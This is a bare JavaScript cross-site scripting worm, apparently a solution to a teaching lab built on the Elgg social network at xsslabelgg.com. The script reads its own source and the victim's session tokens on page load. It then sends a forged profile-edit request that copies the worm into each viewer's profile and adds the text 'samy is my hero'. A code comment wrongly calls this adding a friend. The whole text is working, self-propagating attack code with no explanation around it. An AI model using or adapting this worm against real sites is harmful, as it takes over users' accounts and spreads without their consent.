<script id=worm>
window.onload = function () {
var headerTag= "<script id=\"worm\" type=\"text/javascript\">";
var jsCode=document.getElementById("worm").innerHTML;
var tailTag= "</" + "script>";

var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="__elgg_token="+elgg.security.token.__elgg_token;
var about="&description="+encodeURIComponent(headerTag+jsCode+tailTag)+"&accesslevel[description]=2";
var desc="&briefdescription=samy is my hero&accesslevel[briefdescription]=2";
var location="&location=&accesslevel[location]=2";
var interests="&interests=&accesslevel[interests]=2";
var skills="&skills=&accesslevel[skills]=2";
var contactemail="&contactemail=&accesslevel[contactemail]=2";
var phone="&phone=&accesslevel[phone]=2";
var mobile="&mobile=&accesslevel[mobile]=2";
var website="&website=&accesslevel[website]=2";
var twitter="&twitter=&accesslevel[twitter]=2";
var gender="&gender=female/male/custom";
var content=token+ts+userName+about+desc+location+interests+skills+contactemail+phone+mobile+website+twitter+gender+guid;
var samyGuid="47";

if(elgg.session.user.guid!=samyGuid) {
//Construct the HTTP request to add Samy as a friend.
var sendurl= "http://www.xsslabelgg.com/action/profile/edit";
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(content);
}}
</script>